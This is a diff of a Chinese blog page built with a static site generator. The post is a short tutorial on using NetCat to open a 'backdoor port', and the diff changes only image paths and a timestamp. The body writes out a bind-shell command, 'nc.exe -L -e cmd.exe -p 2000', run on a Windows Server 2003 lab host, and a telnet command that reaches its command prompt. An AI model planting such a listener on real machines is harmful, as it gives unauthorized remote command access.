@@ -97,15 +97,15 @@
 <meta property="og:url" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/index.html">
 <meta property="og:site_name" content="Note&#39;s blog">
 <meta property="og:description" content="NC介绍NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，能被其它的程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。NetCat，它的实际可运行的名字叫nc，在网络工具中有“瑞士">
-<meta property="og:image" content="http://yoursite.com/使用NC-NetCat-开放后门端口/开始监听.jpg">
-<meta property="og:image" content="http://yoursite.com/使用NC-NetCat-开放后门端口/telnet.jpg">
-<meta property="og:image" content="http://yoursite.com/使用NC-NetCat-开放后门端口/建立连接.jpg">
-<meta property="og:image" content="http://yoursite.com/使用NC-NetCat-开放后门端口/参数介绍.jpg">
-<meta property="og:updated_time" content="2017-05-22T02:38:38.396Z">
+<meta property="og:image" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/开始监听.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/telnet.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/建立连接.jpg">
+<meta property="og:image" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/参数介绍.jpg">
+<meta property="og:updated_time" content="2017-06-22T11:18:29.979Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="使用NC(NetCat)开放后门端口">
 <meta name="twitter:description" content="NC介绍NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，能被其它的程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。NetCat，它的实际可运行的名字叫nc，在网络工具中有“瑞士">
-<meta name="twitter:image" content="http://yoursite.com/使用NC-NetCat-开放后门端口/开始监听.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2017/05/22/使用NC-NetCat-开放后门端口/开始监听.jpg">
 
 
 
@@ -417,9 +417,9 @@
       
         <h1 id="NC介绍"><a href="#NC介绍" class="headerlink" title="NC介绍"></a>NC介绍</h1><p>NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，能被其它的程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。NetCat，它的实际可运行的名字叫nc，在网络工具中有“瑞士军刀”的美誉。<br><a id="more"></a></p>
 <h1 id="使用NC开放后门"><a href="#使用NC开放后门" class="headerlink" title="使用NC开放后门"></a>使用NC开放后门</h1><p>登录主机，window server 2003，进入NC目录，cmd下执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc.exe -v -L -e cmd.exe -p 2000 -s 192.168.1.139</div></pre></td></tr></table></figure></p>
-<p><img src="/使用NC-NetCat-开放后门端口/开始监听.jpg" alt=""><br>2000为端口号，192.168.1.139位本机（window server 2003）的ip地址，执行之后，程序会开始监听2000端口。<br>接着在Windows 10主机上使用telnet连接2000端口，直接连上的就是window server 2003的cmd窗口，使用的命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.1.139 2000</div></pre></td></tr></table></figure></p>
-<p><img src="/使用NC-NetCat-开放后门端口/telnet.jpg" alt=""><br>windows server 2003中会显示建立连接：<br><img src="/使用NC-NetCat-开放后门端口/建立连接.jpg" alt=""></p>
-<h1 id="NC各参数介绍"><a href="#NC各参数介绍" class="headerlink" title="NC各参数介绍"></a>NC各参数介绍</h1><p><img src="/使用NC-NetCat-开放后门端口/参数介绍.jpg" alt=""></p>
+<p><img src="/2017/05/22/使用NC-NetCat-开放后门端口/开始监听.jpg" alt=""><br>2000为端口号，192.168.1.139位本机（window server 2003）的ip地址，执行之后，程序会开始监听2000端口。<br>接着在Windows 10主机上使用telnet连接2000端口，直接连上的就是window server 2003的cmd窗口，使用的命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.1.139 2000</div></pre></td></tr></table></figure></p>
+<p><img src="/2017/05/22/使用NC-NetCat-开放后门端口/telnet.jpg" alt=""><br>windows server 2003中会显示建立连接：<br><img src="/2017/05/22/使用NC-NetCat-开放后门端口/建立连接.jpg" alt=""></p>
+<h1 id="NC各参数介绍"><a href="#NC各参数介绍" class="headerlink" title="NC各参数介绍"></a>NC各参数介绍</h1><p><img src="/2017/05/22/使用NC-NetCat-开放后门端口/参数介绍.jpg" alt=""></p>
 
       
     </div>
